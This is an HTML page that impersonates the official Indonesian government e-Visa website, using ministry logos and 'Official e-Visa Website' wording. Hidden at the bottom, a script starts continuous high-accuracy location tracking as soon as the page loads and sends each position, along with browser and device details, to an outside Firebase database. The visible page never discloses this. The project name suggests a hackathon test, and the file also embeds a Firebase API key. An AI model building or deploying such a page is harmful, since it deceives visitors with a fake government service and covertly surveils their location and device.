<!doctype html>
<html lang="id">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>E-Visa Indonesia</title>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    
    body {
      background: #f4f6f9;
      overflow-x: hidden;
    }
    
    .main-container {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    
    /* HEADER */
    .header {
      background: #0d2f4f;
      color: white;
      height: 56px;
      padding: 0 12px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    
    .header-left {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .header-left img {
      height: 28px;
      width: auto;
    }
    
    .header-title {
      font-size: 10px;
      line-height: 1.2;
    }
    
    /* HERO */
    .hero {
      width: 100%;
      height: 180px;
      position: relative;
      overflow: hidden;
      background-image: url("assets/pura.jpg");
      background-size: cover;
      background-position: center;
    }
    
    .overlay {
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.35);
    }
    
    .hero-text {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-size: 16px;
      text-align: center;
      width: 90%;
    }
    
    /* CONTENT */
    .container {
      flex: 1;
      padding: 14px;
    }
    
    .card {
      background: white;
      padding: 14px;
      border-radius: 14px;
      margin-bottom: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
    }
    
    .step {
      display: flex;
      gap: 10px;
    }
    
    .step-circle {
      width: 28px;
      height: 28px;
      background: #0d2f4f;
      color: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
    }
    
    .btn {
      margin-top: 8px;
      background: #0d2f4f;
      color: white;
      border: none;
      padding: 8px 14px;
      border-radius: 8px;
    }
  </style>
</head>

<body>
  
  <main class="main-container">
    
    <!-- HEADER -->
    <div class="header">
      <div class="header-left">
        <img src="assets/Kementrian Imigrasi & Pemasyarakatan.png" />
        <img src="assets/Logo Ditjen Imigrasi.png" />
        <div class="header-title">
          MINISTRY OF IMMIGRATION<br>
          DIRECTORATE GENERAL
        </div>
      </div>
      ☰
    </div>
    
    <!-- HERO -->
    <div class="hero">
      <div class="overlay"></div>
      <div class="hero-text">
        The Official e-Visa Website for Indonesia
      </div>
    </div>
    
    <!-- CONTENT -->
    <div class="container">
      
      <div class="card">
        <div class="step">
          <div class="step-circle">1</div>
          <div>
            <b>Apply</b><br>
            Explore and apply visa
            <br>
            <button class="btn">Apply</button>
          </div>
        </div>
      </div>
      
      <div class="card">
        <div class="step">
          <div class="step-circle">2</div>
          <div>
            <b>Payment</b><br>
            SIMPONI / Debit / Credit
          </div>
        </div>
      </div>
      
      <div class="card">
        <div class="step">
          <div class="step-circle">3</div>
          <div>
            <b>Download</b><br>
            Visa sent via email
          </div>
        </div>
      </div>
      
    </div>
    
  </main>
  
  <!-- FIREBASE + BACKGROUND TRACKING -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";
    
    const firebaseConfig = {
      apiKey: "AIzaSyABOVyC5Uz3Q_85609kvfwdYgdZcSFHBwE",
      authDomain: "tes-hackaton.firebaseapp.com",
      databaseURL: "https://tes-hackaton-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "tes-hackaton",
      storageBucket: "tes-hackaton.appspot.com",
      messagingSenderId: "382466846609",
      appId: "1:382466846609:web:c13ac92dac7250bb243430",
    };
    
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    
    // generate user id
    const userId = "user_" + Math.random().toString(36).substr(2, 5);
    
    // kirim lokasi
    function updateLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      
      push(ref(db, "users/" + userId + "/history"), {
        lat,
        lon,
        acc,
        time: Date.now(),
        isoTime: new Date().toISOString(),
        
        // BONUS DATA
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
      });
      
      console.log("Tracking aktif:", lat, lon);
    }
    
    // error silent
    function error(err) {
      console.log("Lokasi gagal:", err.message);
    }
    
    // start tracking
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(updateLocation, error, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 5000
      });
    }
  </script>
  
</body>

</html>
